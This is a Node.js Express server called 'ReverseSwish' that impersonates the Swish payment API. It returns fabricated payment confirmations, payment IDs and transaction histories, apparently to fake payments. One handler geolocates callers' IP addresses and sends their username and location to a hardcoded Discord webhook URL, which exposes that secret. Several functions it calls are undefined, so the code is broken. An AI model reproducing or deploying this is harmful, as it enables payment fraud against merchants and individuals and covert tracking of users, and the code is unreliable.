// Import packages
const express = require("express");
const axios = require("axios");

const app = express();

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1252955031750311946/M9E0m6o7hH7K9TyQhimNOn3HECIw7k_PS6v3bfpnQoGBWHQZU7ZgO1TaWEGATcarOjyo";

app.use(express.json());

let MSID = ""
let AMOUNT = ""

app.get("/", (req, res) => {
  res.send("ReverseSwish is running! 🚀");
});

// Function to send Discord webhook
function getLocalIpAddress() {
  const nets = networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        return net.address;
      }
    }
  }
  return 'IP address not found';
}

// Function to get IP address information
async function getIpInfo(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data;
  } catch (error) {
    console.error("Error fetching IP information:", error.message);
    return null;
  }
}

app.post("/", async (req, res) => {
  const { username } = req.body;
  const ip = req.ip || getLocalIpAddress();

  const ipInfo = await getIpInfo(ip);

  if (ipInfo) {
    const embedMessage = {
      title: "User Information",
      color: 3447003, // Blue color
      fields: [
        { name: "Username", value: username, inline: true },
        { name: "IP Address", value: ip, inline: true },
        { name: "City", value: ipInfo.city || "N/A", inline: true },
        { name: "Region", value: ipInfo.regionName || "N/A", inline: true },
        { name: "Country", value: ipInfo.country || "N/A", inline: true },
        { name: "ISP", value: ipInfo.isp || "N/A", inline: true },
      ],
      timestamp: new Date(),
    };

    sendDiscordWebhook(embedMessage)
      .then(() => {
        res.status(200).send("Webhook sent successfully");
      })
      .catch(error => {
        res.status(500).send("Error sending webhook: " + error.message);
      });
  } else {
    res.status(500).send("Error fetching IP information");
  }
    next();
});
// Endpoints
app.post("/mpc-swish/api/v4/initiatepayment", async (req, res) => {
  res.status(200).send('{"autoStartToken":"deadb33f-cdb6-4df3-8de0-deadb33f","result":"200","paymentID":"DEADB33F"}');
});

app.get("/mpc-swish/api/v1/blocks/", (req, res) => {
  res.status(200).send('{"time":"2024-06-19T13:38:01.122+00:00","block":[]}');
});

app.get("/mpc-swish/api/v4/paymenthistory/100/INCOMING/0/100/", (req, res) => {
  res.status(200).send(`{
    "result": "200",
    "bankIdOrderReference": null,
    "dateTimeOfSearch": null,
    "endOfSearch": true,
    "item": [{
      "paymentChannel": "MPC",
      "amount": "1.00",
      "currency": "SEK",
      "payerPayee": {
        "name": "TEST USER",
        "businessName": null,
        "alias": "46700000000"
      },
      "message": "This is an example message.",
      "orderId": null,
      "paymentType": "P2P",
      "gift": {
        "themeId": "sallad1"
      },
      "birPaymentId": "123123123",
      "paymentDirection": "INCOMING",
      "bankPaymentReference": "123123123",
      "dateTime": "2019-04-01T11:56:23"
    }]
  }`);
});

app.get("/mpc-swish/api/v4/paymenthistory/100/ALL/0/100/", (req, res) => {
  res.status(200).send(`{
    "result": "200",
    "bankIdOrderReference": null,
    "dateTimeOfSearch": null,
    "endOfSearch": true,
    "item": [{
      "paymentChannel": "MPC",
      "amount": "1.00",
      "currency": "SEK",
      "payerPayee": {
        "name": "TEST USER",
        "businessName": null,
        "alias": "46700000000"
      },
      "message": "This is an example message.",
      "orderId": null,
      "paymentType": "P2P",
      "gift": {
        "themeId": "sallad1"
      },
      "birPaymentId": "123123123",
      "paymentDirection": "INCOMING",
      "bankPaymentReference": "123123123",
      "dateTime": "2019-04-01T11:56:23"
    }]
  }`);
});

app.get("/mpc-swish/api/v4/paymenthistory/100/OUTGOING/0/100/", (req, res) => {
  res.status(200).send(`{
    "result": "200",
    "bankIdOrderReference": null,
    "dateTimeOfSearch": null,
    "endOfSearch": true,
    "item": [{
      "paymentChannel": "MPC",
      "amount": "1.00",
      "currency": "SEK",
      "payerPayee": {
        "name": "TEST USER",
        "businessName": null,
        "alias": "46700000000"
      },
      "message": "This is an example message.",
      "orderId": null,
      "paymentType": "P2P",
      "gift": {
        "themeId": "sallad1"
      },
      "birPaymentId": "123123123",
      "paymentDirection": "INCOMING",
      "bankPaymentReference": "123123123",
      "dateTime": "2019-04-01T11:56:23"
    }]
  }`);
});

app.get("/mpc-swish/api/v1/paymentrequest/findByRoleAndState", (req, res) => {
  res.status(200).send(`{
    "data": [{
      "id": "2dcfdaa5-416f-49c6-84ed-337a09d4157f",
      "state": "CONFIRMED",
      "amount": "1",
      "currency": "SEK",
      "senderName": "Person 194711026924",
      "senderAlias": "4670000000",
      "receiverName": "Marianne Essen Nordlander",
      "receiverAlias": "4670000001",
      "message": "Sent, CONFIRMED",
      "deniedMessage": null,
      "viewed": false,
      "initiatedAt": "2019-12-17T12:53:37.281Z",
      "confirmedAt": "2019-12-17T12:53:41.089Z",
      "cancelledAt": null,
      "deniedAt": null,
      "deletedAt": null,
      "updatedAt": "2019-12-17T12:53:41.089Z",
      "expiredAt": "2020-02-15T12:53:41.089Z"
    }]
  }`);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
